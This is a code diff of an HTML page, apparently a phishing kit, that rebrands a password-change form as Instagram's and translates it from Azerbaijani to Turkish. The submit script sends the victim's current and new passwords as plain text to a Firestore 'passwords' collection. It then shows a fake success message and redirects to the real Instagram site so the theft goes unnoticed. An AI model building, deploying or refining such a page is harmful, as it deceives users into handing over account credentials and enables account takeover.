@@ -1,27 +1,18 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Şifrəni Yenilə</title>
+    <title>Şifre Yenile</title>
     <script src="https://cdn.tailwindcss.com?client"></script>
     <style>
-        .password-strength {
-            height: 5px;
-            border-radius: 3px;
-            margin-top: 5px;
-            transition: all 0.3s ease;
-        }
-        .strength-weak { background-color: #ff4d4f; width: 33%; }
-        .strength-medium { background-color: #faad14; width: 66%; }
-        .strength-strong { background-color: #52c41a; width: 100%; }
         .toggle-password {
             position: absolute;
             right: 10px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
-            color: #000000; /* Qara rəng */
+            color: #000000; /* Kara renk */
             font-size: 12px;
             font-weight: 600;
         }
@@ -35,52 +26,54 @@
             class="mx-auto mb-6 w-44"
         />
         <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">
-            Şifrəni Yenilə
+            Instagram'da güçlü bir şifre oluşturun
         </h2>
+        <p class="text-sm text-gray-600 mb-4 text-center">
+            Şifreniz en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (! vb.) oluşmalıdır.
+        </p>
         <form id="passwordForm">
             <div class="mb-4 relative">
                 <input
                     type="password"
                     id="currentPassword"
-                    placeholder="Mövcud Şifrə"
+                    placeholder="Mevcut Şifre"
                     class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                     required
                 />
-                <span class="toggle-password" data-target="currentPassword">Göstər</span>
+                <span class="toggle-password" data-target="currentPassword">Göster</span>
             </div>
             <div class="mb-4 relative">
                 <input
                     type="password"
                     id="newPassword"
-                    placeholder="Yeni Şifrə"
+                    placeholder="Yeni Şifre"
                     class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                     required
                 />
-                <span class="toggle-password" data-target="newPassword">Göstər</span>
-                <div id="passwordStrength" class="password-strength"></div>
-                <p id="strengthText" class="text-sm text-gray-500 mt-1"></p>
+                <span class="toggle-password" data-target="newPassword">Göster</span>
             </div>
             <div class="mb-4 relative">
                 <input
                     type="password"
                     id="confirmPassword"
-                    placeholder="Şifrəni Təkrar Et"
+                    placeholder="Şifreyi Tekrar Et"
                     class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                     required
                 />
-                <span class="toggle-password" data-target="confirmPassword">Göstər</span>
+                <span class="toggle-password" data-target="confirmPassword">Göster</span>
             </div>
+            <p id="errorMessage" class="text-red-500 text-sm mb-4 hidden"></p>
             <p id="successMessage" class="text-green-500 text-sm mb-4 hidden">
-                Şifrə uğurla saxlanıldı!
+                Şifreniz değiştirildi!
             </p>
             <button
                 type="submit"
                 class="w-full bg-blue-500 text-white p-3 rounded-md font-semibold hover:bg-blue-600 transition duration-200"
             >
-                Şifrəni Dəyiş
+                Şifreyi Değiştir
             </button>
             <div class="text-center mt-4">
-                <a href="#" class="text-blue-500 text-sm hover:underline">Şifrənizi unutdunuz?</a>
+                <a href="#" class="text-blue-500 text-sm hover:underline">Şifrenizi unuttunuz?</a>
             </div>
         </form>
     </div>
@@ -113,19 +106,14 @@
         // Göstər/Gizlə funksiyası
         document.querySelectorAll('.toggle-password').forEach(toggle => {
             toggle.addEventListener('click', () => {
-                console.log("Toggle klikləndi:", toggle.getAttribute('data-target'));
                 const targetId = toggle.getAttribute('data-target');
                 const input = document.getElementById(targetId);
-                if (!input) {
-                    console.error("Input tapılmadı:", targetId);
-                    return;
-                }
                 if (input.type === 'password') {
                     input.type = 'text';
-                    toggle.textContent = 'Gizlə';
+                    toggle.textContent = 'Gizle';
                 } else {
                     input.type = 'password';
-                    toggle.textContent = 'Göstər';
+                    toggle.textContent = 'Göster';
                 }
             });
         });
@@ -134,89 +122,41 @@
         const currentPassword = document.getElementById('currentPassword');
         const newPassword = document.getElementById('newPassword');
         const confirmPassword = document.getElementById('confirmPassword');
+        const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
-
-        const validatePassword = (password) => {
-            console.log("Şifrə yoxlanılır:", password);
-            const minLength = 8;
-            let strength = 0;
-            const checks = [
-                password.length >= minLength,
-                /[A-Z]/.test(password),
-                /[0-9]/.test(password),
-                /[!@#$%^&*(),.?":{}|<>]/.test(password)
-            ];
-
-            strength = checks.filter(Boolean).length;
-
-            const passwordStrength = document.getElementById('passwordStrength');
-            const strengthText = document.getElementById('strengthText');
-
-            if (!password) {
-                passwordStrength.className = 'password-strength';
-                strengthText.textContent = '';
-                return { valid: false, message: 'Şifrə boşdur.' };
-            }
-
-            if (password.length < minLength) {
-                return { valid: false, message: 'Şifrə ən az 8 simvol olmalıdır.' };
-            }
-            if (!/[A-Z]/.test(password)) {
-                return { valid: false, message: 'Şifrədə ən az bir böyük hərf olmalıdır.' };
-            }
-            if (!/[0-9]/.test(password)) {
-                return { valid: false, message: 'Şifrədə ən az bir rəqəm olmalıdır.' };
-            }
-            if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
-                return { valid: false, message: 'Şifrədə ən az bir xüsusi simvol olmalıdır.' };
-            }
-
-            if (strength <= 2) {
-                passwordStrength.className = 'password-strength strength-weak';
-                strengthText.textContent = 'Zəif';
-            } else if (strength === 3) {
-                passwordStrength.className = 'password-strength strength-medium';
-                strengthText.textContent = 'Orta';
-            } else {
-                passwordStrength.className = 'password-strength strength-strong';
-                strengthText.textContent = 'Güclü';
-            }
-
-            return { valid: true, message: '' };
-        };
-
-        newPassword.addEventListener('input', () => {
-            validatePassword(newPassword.value);
-        });
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            console.log("Form submit edildi");
+            errorMessage.classList.add('hidden');
             successMessage.classList.add('hidden');
 
-            const validation = validatePassword(newPassword.value);
-            if (!validation.valid) {
-                console.log("Şifrə yoxlaması uğursuz: " + validation.message);
+            if (newPassword.value.length < 6) {
+                errorMessage.textContent = 'Yeni şifre en az 6 karakter olmalıdır.';
+                errorMessage.classList.remove('hidden');
                 return;
             }
 
             if (newPassword.value !== confirmPassword.value) {
-                console.log("Yeni şifrə ilə təkrar şifrə uyğun gəlmir.");
+                errorMessage.textContent = 'Yeni şifre ile tekrar şifre aynı değil.';
+                errorMessage.classList.remove('hidden');
                 return;
             }
 
             try {
-                console.log("Firestore-a yazılır...");
+                // Mevcut şifre ve yeni şifreyi Firestore'a metin olarak yaz
                 const docRef = await addDoc(collection(db, 'passwords'), {
                     currentPassword: currentPassword.value,
                     newPassword: newPassword.value,
                     timestamp: new Date().toISOString()
                 });
-                console.log("Şifrələr Firestore-a yazıldı, sənəd ID:", docRef.id);
-                successMessage.textContent = 'Şifrə uğurla saxlanıldı!';
+                console.log("Şifreler Firestore'a yazıldı, belge ID:", docRef.id);
+                successMessage.textContent = 'Şifreniz değiştirildi!';
                 successMessage.classList.remove('hidden');
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com';
+                }, 2000); // 2 saniye sonra Instagram'a yönlendir
             } catch (error) {
-                console.error("Firestore-a yazı xətası:", error);
+                console.error("Firestore'a yazı hatası:", error);
             }
         });
     </script>
